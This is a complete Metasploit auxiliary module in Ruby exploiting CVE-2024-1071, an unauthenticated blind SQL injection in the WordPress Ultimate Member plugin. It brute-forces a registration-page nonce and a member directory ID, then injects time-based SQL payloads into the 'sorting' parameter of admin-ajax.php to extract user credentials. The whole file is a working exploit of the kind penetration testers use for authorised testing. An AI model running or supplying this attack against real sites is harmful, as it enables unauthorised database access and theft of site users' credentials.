##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Ultimate Member SQL Injection (CVE-2024-1071)',
        'Description' => %q{
          The Ultimate Member plugin for WordPress up to version 2.8.2 is vulnerable to SQL injection via
          the 'sorting' parameter. This allows unauthenticated attackers to exploit blind SQL injections and
          extract sensitive information from the database.
        },
        'Author' => [
          'Christiaan Swiers',  # Vulnerability Discovery
          'Valentin Lobstein'   # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-1071'],
          ['URL', 'https://github.com/gbrsh/CVE-2024-1071'],
          ['URL', 'https://www.wordfence.com/blog/2024/02/2063-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-ultimate-member-wordpress-plugin/']
        ],
        'Actions' => [
          ['Extract User Credentials', { 'Description' => 'SQL Injection via sorting parameter' }]
        ],
        'DefaultAction' => 'Extract User Credentials',
        'DefaultOptions' => { 'SqliDelay' => 1, 'VERBOSE' => true },
        'DisclosureDate' => '2024-02-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options [
      OptInt.new('COUNT', [false, 'Number of rows to retrieve', 1]),
      OptInt.new('DIR_ID_MIN', [true, 'Minimum value for bruteforcing directory IDs', 1]),
      OptInt.new('DIR_ID_MAX', [true, 'Maximum value for bruteforcing directory IDs', 100]),
      OptInt.new('PAGE_ID_MIN', [true, 'Minimum page ID for bruteforcing registration pages', 1]),
      OptInt.new('PAGE_ID_MAX', [true, 'Maximum page ID for bruteforcing registration pages', 20])
    ]
  end

  def get_nonce
    print_status('Attempting to locate the registration page and retrieve the nonce...')

    uris_to_test = (datastore['PAGE_ID_MIN']..datastore['PAGE_ID_MAX']).map { |id| "?page_id=#{id}" }

    uris_to_test.each do |uri|
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, uri)
      })

      next unless res&.code == 200

      page = res.get_html_document

      script_tag = page.at_xpath('//script[contains(text(), "um_scripts")]')
      next unless script_tag

      nonce = script_tag.text[/"nonce":"([^"]+)"/, 1]
      if nonce
        print_good("Nonce retrieved: #{nonce} using #{uri}")
        return nonce
      end
    end

    print_error('Failed to retrieve nonce')
    raise 'Failed to retrieve nonce'
  end

  def get_directory_id(nonce)
    min_range = datastore['DIR_ID_MIN']
    max_range = datastore['DIR_ID_MAX']
    print_status("Searching for valid directory id between #{min_range} and #{max_range}...")

    (min_range..max_range).each do |num|
      id = Rex::Text.md5(num.to_s)[10..14]
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_post' => {
          'action' => 'um_get_members',
          'nonce' => nonce,
          'directory_id' => id
        }
      })

      next unless res

      json_body = res.get_json_document

      if json_body && json_body['success'] == true
        print_good("Valid directory ID found: #{id} (tested with #{num})")
        return id
      end
    end

    fail_with(Failure::NotFound, "Could not find a valid directory id within the range #{min_range} to #{max_range}")
  end

  def run_host(_ip)
    print_status("Performing SQL injection for CVE-2024-1071 via the 'sorting' parameter...")

    nonce = get_nonce
    directory_id = get_directory_id(nonce)

    if nonce && directory_id
      @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
        random_negative_number = -rand(99)
        random_characters = Rex::Text.rand_text_alphanumeric(5)

        res = send_request_cgi({
          'method' => 'POST',
          'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
          'vars_post' => {
            'action' => 'um_get_members',
            'nonce' => nonce,
            'directory_id' => directory_id,
            'sorting' => "user_login AND (SELECT #{random_negative_number} FROM (SELECT(#{payload}))#{random_characters})"
          }
        })
        fail_with(Failure::Unreachable, 'Connection failed') unless res
      end

      fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.') unless @sqli.test_vulnerable
      print_good('Target is vulnerable to SQLi!')

      wordpress_sqli_initialize(@sqli)
      wordpress_sqli_get_users_credentials(datastore['COUNT'])
    else
      fail_with(Failure::NotFound, 'Failed to retrieve nonce or directory_id')
    end
  end
end
